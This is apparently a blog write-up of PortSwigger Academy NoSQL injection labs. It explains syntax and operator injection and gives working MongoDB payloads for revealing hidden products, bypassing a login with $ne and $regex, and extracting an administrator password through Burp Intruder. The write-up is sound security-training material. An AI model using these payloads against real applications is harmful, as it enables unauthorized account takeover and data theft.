NoSQL injection is similar to SQL injection in that it allows an attacker to manipulate or inject malicious input into a NoSQL query to retrieve, modify, or delete data. However, the key difference lies in the database type and query language.  
* SQLi
  * SQL database (E.g., MariaDB, MySQL, PostgreSQL)
  * Structure Query Language

  
* NoSQLi
  * Semi-structured database (E.g., MongoDB, CouchDB)
  * JSON-like documents or key-value pairs

### Types of NoSQLi
1. Syntax injection: Attacker injects an unclosed string literal (`'`), to break the query’s logic.
2. Operator injection: Attacker injects NoSQL operator (`$gt`, `$lt`, `$eq`, `$ne`, `$regex`, etc.) into the query, changing the query’s logic to return unintended results or bypass authentication.

### Lab
Just for demostration, I completed some labs on [PortSwigger Academy](https://portswigger.net/web-security/all-labs#nosql-injection) to show how this vulnerability can lead to:

#### Detecting NoSQL injection
The product category filter for this specific web application is powered by MongoDB, I utilize NoSQL injection that causes the application to display unreleased products.  
  
Firstly, I capture and modify the `GET /filter?category=(category)` request using Burp Repeater.  
Then testing the vulnerability by using a single quote `'` to break the query and trigger a server error.  
After identifying the vulnerability, I insert boolean/truthy expression payloads to manipulate the server response with Burp Repeater and reveal hidden items.  
  ~~~
  GET /filter?category=Pets '||'1'=='1 or
  GET /filter?category=Pets '||1|| '
  ~~~

#### NoSQL operator injection to bypass authentication  
The login functionality for this specific application is powered by MongoDB. Which can be potentially vulnerable to NoSQL injection using MongoDB operators. Our goal is to log into the application as the administrator user.  
  
To test the operator injection vulnerability, I use Burp Proxy to capture the `login request`, and change the `password parameter value` with MongoDB operators on Burp Repeater
 ~~~
{"username": "user1", "password":{"$ne":"dgdfg"}}
 ~~~
 > Response: 302 Indicates the operator injection is valid, we log in as user1 with password is not equal to dgdfg.  
 > HTTP/2 302 Found  
 > Location: /my-account?id=user1  
 > Set-Cookie: session = T3qC4KyBeNJLu0SwOrBuv9M7ko6rDiMa;  
 > Secure; HttpOnly; SameSite=None  
 > X-Frame-Options: SAMEORIGIN  
 > Content-Length: 0

Now that I know the web application is vulnerable to NoSQL injection, I will try using regex for all common administrator usernames and repeat the same process as the previous step for the password.
 ~~~
 {"username":{"$regex":"adm.*"},"password":{"$ne":""}} 
 ~~~
 > Response: 302 Indicates the operator injection is valid, we log in as admin9hhcmyfb with password is not equal to blank.  
 > HTTP/2 302 Found  
 > /my-account?id=admin9hhcmyfb  
 > Set-Cookie: session = T3qC4KyBeNJLu0SwOrBuv9M7ko6rDiMa;  
 > Secure; HttpOnly; SameSite=None  
 > X-Frame-Options: SAMEORIGIN  
 > Content-Length: 0

**Note:** Refer to [MongoDB Documentation](https://www.mongodb.com/docs/php-library/current/crud/query/specify-a-query/) for more details about its operators

#### Exploiting NoSQL injection to extract data 
The user lookup functionality for this instnace is powered by a MongoDB NoSQL database. It is possibly vulnerable to NoSQL injection. Our goal is to extract the password for the administrator user, then log in to their account.
Firstly 
To test the vulnerability, I start off sending a single character with in GET `/user/lookup?user=`
 ~~~
 GET /user/lookup?user=' 
 ~~~
 > Response: The message in the response indicates this is vulnerabile to NoSQLi  
 > HTTP/2 200 OK  
 > Content-Type: application/json;  
 > charset=utf-8  
 > X-Frame-Options: SAMEORIGIN  
 > Content-Length: 58  
 > {"message": "There was an error getting user details"}  

Then I modify and send a Boolean expression in Burp Repeater to discover a hidden user, such as "administrator": 
 ~~~
 GET /user/lookup?user=wiener'||'1'=='1 
 ~~~
 > Response: It provides me the available user's information  
 > HTTP/2 200 OK  
 > Content-Type: application/json;  
 > charset=utf-8  
 > X-Frame-Options: SAMEORIGIN  
 > Content-Length: 96  
 > {"username": "administrator", "email":"admin@normal-user.net", "role":"administrator"}

Now we have the username, time to figure out thier password. I use Burp Intruder to submit numeric payloads (1–30) and determine that the administrator's password length is 8 by studying the Length of the response: 
 ~~~
 administrator' && this.password.length == §1§ 
 ~~~
![Burp Intruder Response](https://rencybersec.github.io/assets/img/githubpost/NoSQLi_1.png)

After determining the password length, I use Intruder’s Cluster Bomb attack mode to discover each character of the password. The first payload position represents the index (0–7) of each character in the administrator's password, while the second payload position represents the character (a–z) to test at each position. We will reuse the same technique from the previous step, where we analyze the response length to determine which letter appears in the password.
 ~~~
 administrator' && this.password[§0§] == '§a§
 ~~~
